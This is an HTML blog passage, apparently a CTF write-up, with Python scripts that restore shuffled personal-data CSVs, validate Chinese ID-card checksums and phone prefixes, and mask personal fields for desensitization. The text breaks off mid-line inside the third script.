    <content type="html"><![CDATA[<h1 id="初赛-数据安全"><a href="#初赛-数据安全" class="headerlink" title="[初赛] 数据安全"></a>[初赛] 数据安全</h1><h2 id="data-analy1"><a href="#data-analy1" class="headerlink" title="data-analy1"></a>data-analy1</h2><p>恢复被打乱的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>data = pd.read_csv(<span class="hljs-string">&quot;person_data.csv&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>y = data.to_dict(orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br><br>d = &#123;<span class="hljs-string">&#x27;编号&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;姓名&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;性别&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;出生日期&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;身份证号&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;手机号码&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br><br><br>header = data.columns.values.tolist()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;person_data_new.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f_csv = csv.writer(f)<br>    f_csv.writerow(header)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanzi</span>(<span class="hljs-params">data</span>):<br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[\u4e00-\u9fa5]&#123;2,&#125;&#x27;</span>)<br>    matches = pattern.findall(data)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(matches) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> y:<br>    <span class="hljs-keyword">for</span> _, value <span class="hljs-keyword">in</span> i.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">18</span> <span class="hljs-keyword">and</span> value[<span class="hljs-number">0</span>:<span class="hljs-number">17</span>].isdigit():<br>            d[<span class="hljs-string">&#x27;身份证号&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;性别&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">8</span> <span class="hljs-keyword">and</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;出生日期&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> re.search(<span class="hljs-string">r&#x27;[a-fA-F0-9]&#123;32&#125;&#x27;</span>, value)!=<span class="hljs-literal">None</span>:<br>            d[<span class="hljs-string">&#x27;密码&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> hanzi(value):<br>            d[<span class="hljs-string">&#x27;姓名&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">11</span> <span class="hljs-keyword">and</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;手机号码&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;编号&#x27;</span>] = value<br>        <span class="hljs-keyword">else</span>:<br>            d[<span class="hljs-string">&#x27;用户名&#x27;</span>] = value<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;person_data_new.csv&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f_csv = csv.writer(f)<br>        f_csv.writerow(d.values())<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy1.png"></p><h2 id="data-analy2"><a href="#data-analy2" class="headerlink" title="data-analy2"></a>data-analy2</h2><p>与上一题类似，筛选出不符合格式的数据</p><p>先从流量包中导出数据</p><p><code>tshark -r data.pcapng -T fields -e http.file_data -Y &quot;http.request&quot; &gt; data.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br>e = [<span class="hljs-built_in">bytes</span>.fromhex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read().splitlines()]<br>f.close()<br><br>d = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    <span class="hljs-keyword">if</span> i.strip():<br>        d.append(i)<br>e = <span class="hljs-string">b&#x27;[&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span>.join(d) + <span class="hljs-string">b&#x27;]&#x27;</span><br><br>d = json.loads(e)<br><br><span class="hljs-comment"># l = &#123;&#x27;username&#x27;: &#x27;&#x27;, &#x27;name&#x27;: &#x27;&#x27;, &#x27;sex&#x27;: &#x27;&#x27;, &#x27;birth&#x27;: &#x27;&#x27;, &#x27;idcard&#x27;: &#x27;&#x27;, &#x27;phone&#x27;: &#x27;&#x27;&#125;</span><br><br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&#x27;data.csv&#x27;</span>):<br>    os.remove(<span class="hljs-string">&#x27;data.csv&#x27;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>)<br>f_csv = csv.writer(f)<br>f_csv.writerow(d[<span class="hljs-number">0</span>].keys())<br><br>phum = [<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>, <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>,<br>        <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>, <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>,<br>        <span class="hljs-number">777</span>, <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 将data前17位数字分别乘以不同的系数。从第⼀位到第⼗七位的系数分别是： 7, 9, 10 , 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2</span><br>    <span class="hljs-comment"># 将这17位数字和系数相乘的结果相加。</span><br>    <span class="hljs-comment"># 用加出来和除以11，得到余数</span><br>    <span class="hljs-comment"># 余数的结果对应的数字即为第18位数字。如果余数是2，那么第18位数字就是x</span><br><br>    data = data[:-<span class="hljs-number">1</span>]<br>    data = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, data))<br>    xi = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-built_in">sum</span> += xi[i] * <span class="hljs-built_in">int</span>(data[i])<br>    <span class="hljs-built_in">sum</span> %= <span class="hljs-number">11</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">0</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">1</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">2</span>:<br>        data.append(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">12</span> - <span class="hljs-built_in">sum</span>))<br>    <span class="hljs-keyword">return</span> data[-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> i.items():<br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;username&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value.isalnum():<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;username: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;name&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(<span class="hljs-string">&#x27;\u4e00&#x27;</span> &lt;= char &lt;= <span class="hljs-string">&#x27;\u9fa5&#x27;</span> <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> value):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;idcard&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">18</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value[:-<span class="hljs-number">1</span>].isdigit() <span class="hljs-keyword">or</span> value[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789X&#x27;</span> <span class="hljs-keyword">or</span> value[-<span class="hljs-number">1</span>] != check(<br>                    value):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;idcard: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;sex&#x27;</span>:<br>            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>] <span class="hljs-keyword">or</span> (value == <span class="hljs-string">&#x27;男&#x27;</span> <span class="hljs-keyword">and</span> i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">16</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;13579&#x27;</span>) <span class="hljs-keyword">or</span> (<br>                    value == <span class="hljs-string">&#x27;女&#x27;</span> <span class="hljs-keyword">and</span> i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">16</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;02468&#x27;</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sex: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;birth&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value.isdigit() <span class="hljs-keyword">or</span> value != i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">6</span>:<span class="hljs-number">14</span>] <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[:<span class="hljs-number">4</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1900</span>,<br>                                                                                                                   <span class="hljs-number">2021</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(<br>                value[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[<span class="hljs-number">6</span>:]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;birth: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;phone&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">11</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value.isdigit() <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[:<span class="hljs-number">3</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> phum:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;phone: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy2.png"></p><h2 id="data-analy3"><a href="#data-analy3" class="headerlink" title="data-analy3"></a>data-analy3</h2><p>给了三个日志文件，只有<code>error.log</code>有数据</p><p>部分校验与第二题类似，多了一个脱敏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><br><span class="hljs-comment"># 数据脱敏函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data, flag</span>):<br>    <span class="hljs-comment"># username</span><br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(data) - <span class="hljs-number">2</span>) + data[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># password</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> hashlib.md5(data.encode()).hexdigest()<br>    <span class="hljs-comment"># name</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">3</span>:<br>        pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[\u4e00-\u9fa5]+&#x27;</span>)<br>        <span class="hljs-keyword">match</span> = pattern.findall(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>]) != <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-keyword">raise</span> Exception()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>]) == <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>]) - <span class="hljs-number">2</span>) + <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># idcard</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">4</span>:<br>        <span class="hljs-comment"># 只显示年份</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">6</span> + data[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">8</span><br>    <span class="hljs-comment"># phone</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">return</span> data[:<span class="hljs-number">3</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">4</span> + data[-<span class="hljs-number">4</span>:]<br><br><br><span class="hljs-comment"># 身份证校验</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sfz_check</span>(<span class="hljs-params">data</span>):<br>    data = data[:-<span class="hljs-number">1</span>]<br>    data = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, data))<br>    xi = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-built_in">sum</span> += xi[i] * <span class="hljs-built_in">int</span>(data[i])<br>    <span class="hljs-built_in">sum</span> %= <span class="hljs-number">11</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">0</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">1</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">2</span>:<br>        data.append(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">12</span> - <span class="hljs-built_in">sum</span>))<br>    <span class="hljs-keyword">return</span> data[-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;error.log&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;username=(.*?)&amp;name=(.*?)&amp;idcard=(.*?)&amp;phone=(.+)&#x27;</span>)<br>pattern2 = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;: ([\w\d]+?)\\n&#x27;</span>)<br><br>phum = [<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>, <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>,<br>        <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>, <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>,<br>        <span class="hljs-number">777</span>, <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>]<br><br><br>ds = []<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(data):<br>    <span class="hljs-keyword">match</span> = pattern.findall(parse.unquote(data[i].decode()))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        passwddata = <span class="hljs-string">b&#x27;&#x27;</span>.join(data[i:i + <span class="hljs-number">10</span>]).decode()<br>        passwd = 